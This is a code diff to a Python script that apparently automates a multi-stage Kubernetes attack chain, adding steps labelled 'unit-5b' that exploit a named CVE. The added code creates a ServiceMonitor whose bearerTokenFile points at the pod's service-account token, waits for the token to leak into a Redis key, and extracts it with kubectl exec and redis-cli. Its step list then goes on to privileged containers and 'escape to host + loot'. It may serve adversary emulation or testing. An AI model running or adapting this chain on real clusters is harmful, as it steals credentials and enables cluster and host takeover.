@@ -110,6 +110,16 @@ def ctrl_sa_id():
                      and ING_NS in n["id"])
 
 
+def redis_pod_id():
+    return find_node(lambda n: "pod" in (n.get("kind") or "").lower()
+                     and "/oopservability/" in n["id"] and "redis" in n["id"])
+
+
+def redis_sa_id():
+    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
+                     and "oopservability" in n["id"] and "redis" in n["id"])
+
+
 def adm_clusterip():
     _, out = sh(f"kubectl -n {ING_NS} get svc {ADM_SVC} -o jsonpath='{{.spec.clusterIP}}'")
     return out.strip()
@@ -520,6 +530,51 @@ def orchestrator_identity():
     return None
 
 
+def step_graft_arm(ctx):
+    """unit-5b: pivot — arm CVE-2026-47701. ServiceMonitor w/ bearerTokenFile →
+    target-allocator injects the sidecar → it leaks the agent-orchestrator token
+    into oopservability-redis. This is what makes 18-20's identity ingestable;
+    chain-3's ingress RCE alone cannot produce a Ran-auth identity (controller
+    has no exec channel)."""
+    execute("install-package", pod_id("agent-system", "agent-worker"),
+            {"PKG": "redis-tools"}, "unit-5b: install redis-cli for the token extract")
+    sa = redis_sa_id()
+    if sa and execute("create-servicemonitor-bearer-token-file", sa,
+                      note="unit-5b: CVE-2026-47701 arm the leak",
+                      auth=sa, exec_sys=exec_system()):
+        pass
+    else:
+        print("      TTP not groundable locally -> creating the ServiceMonitor CR directly")
+        sm = ('apiVersion: monitoring.coreos.com/v1\nkind: ServiceMonitor\n'
+              'metadata:\n  name: redis-metrics\n  namespace: oopservability\n'
+              '  labels:\n    app.kubernetes.io/component: redis-metrics\n'
+              'spec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: redis-metrics\n'
+              '  endpoints:\n    - port: http\n      path: /collect\n      interval: 5s\n'
+              '      bearerTokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token\n')
+        open("/tmp/sm.yaml", "w").write(sm)
+        rc, out = sh("kubectl apply -f /tmp/sm.yaml"); print("      ->", out.strip()[:120])
+        if rc != 0: return False
+    print("      waiting for the sidecar to leak its token into redis...")
+    for _ in range(24):
+        time.sleep(10)
+        _, v = sh("kubectl -n oopservability exec "
+                  "$(kubectl -n oopservability get pod -l app.kubernetes.io/name=oopservability-redis "
+                  "-o jsonpath='{.items[0].metadata.name}') -c redis -- "
+                  "redis-cli --raw GET 'oopservability:receiver:last-authorization'")
+        if "Bearer" in v:
+            print("      -> leaked orchestrator token present in redis key"); return True
+    print("      -> redis key still empty"); return False
+
+
+def step_graft_extract(ctx):
+    """unit-5b: extract & INGEST the agent-orchestrator token via CVE-2026-47701.
+    rawServiceaccountToken registers it as an auth identity, so orchestrator_identity()
+    (unchanged) now resolves an INGESTED, auth-capable node for 18-20."""
+    return execute("extract-serviceaccount-token-via-cve-2026-47701", redis_pod_id(),
+                   note="unit-5b: harvest agent-orchestrator token from redis key",
+                   exec_sys=foothold_system())
+
+
 def step_18_check_captured(ctx):
     """unit-6/1: Check Token Permissions on the captured token. Identical to chain 2."""
     tgt = orchestrator_identity()
@@ -581,6 +636,8 @@ STEPS = [
     ("unit-5", "check controller token perms", step_15_check_ctrl_token),
     ("unit-5", "read cluster Secrets with controller token", step_16_read_cluster_secret),
     ("unit-5", "exfiltrate controller token over the wire", step_17_exfil_token),
+    ("unit-5b", "arm CVE-2026-47701 ServiceMonitor leak", step_graft_arm),
+    ("unit-5b", "extract & ingest orchestrator token", step_graft_extract),
     ("unit-6", "check captured token perms", step_18_check_captured),
     ("unit-6", "deploy privileged container", step_19_deploy_privileged),
     ("unit-7", "escape to host + loot", step_20_escape_and_loot),
